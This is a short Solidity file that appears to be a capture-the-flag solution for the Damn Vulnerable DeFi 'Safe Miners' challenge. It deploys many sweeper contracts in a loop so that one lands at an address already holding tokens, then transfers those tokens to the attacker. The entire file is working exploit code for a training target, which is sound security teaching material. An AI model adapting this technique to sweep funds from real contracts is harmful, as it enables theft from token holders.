// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import { IERC20 } from "../DamnValuableToken.sol";

contract SafeMinersAttack {
    constructor(
        address attacker,
        IERC20 token,
        uint256 nonces
    ) {
        for (uint256 idx; idx < nonces; idx++) {
            new TokenSweeper(attacker, token);
        }
    }
}

contract TokenSweeper {
    constructor(address attacker, IERC20 token) {
        uint256 balance = token.balanceOf(address(this));
        if (balance > 0) {
            token.transfer(attacker, balance);
        }
    }
}
